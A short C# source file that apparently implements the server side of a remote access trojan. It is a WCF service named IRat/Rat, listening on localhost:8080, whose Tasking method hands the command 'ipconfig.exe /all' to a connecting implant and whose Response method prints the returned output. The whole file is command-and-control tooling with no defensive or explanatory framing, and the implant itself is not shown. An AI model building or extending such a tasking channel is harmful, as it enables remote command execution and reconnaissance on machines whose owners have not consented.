using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ServiceModel;
using System.ServiceModel.Description;
using System.Reflection;


[ServiceContract]
public interface IRat
{
	[OperationContract]
	string Tasking();

	[OperationContract]
	void Response(string output);
	
}

public class Rat : IRat
{
	public string Tasking()
	{
		return "ipconfig.exe /all";
	}

	public void Response(string output)
	{
		Console.WriteLine(output);
		
	}

}

class Program
{
	static void Main(string[] args)
	{
		Uri baseAddress = new Uri("http://localhost:8080/hello.svc");

		// Create the ServiceHost.
		using (ServiceHost host = new ServiceHost(typeof(Rat), baseAddress))
		{
			// Enable metadata publishing.
			ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
			smb.HttpGetEnabled = true;
			smb.MetadataExporter.PolicyVersion = PolicyVersion.Policy15;
			host.Description.Behaviors.Add(smb);

			// Open the ServiceHost to start listening for messages. Since
			// no endpoints are explicitly configured, the runtime will create
			// one endpoint per base address for each service contract implemented
			// by the service.
			host.Open();

			Console.WriteLine("The service is ready at {0}", baseAddress);
			Console.WriteLine("Press <Enter> to stop the service.");
			Console.ReadLine();

			// Close the ServiceHost.
			host.Close();
		}
	}
}
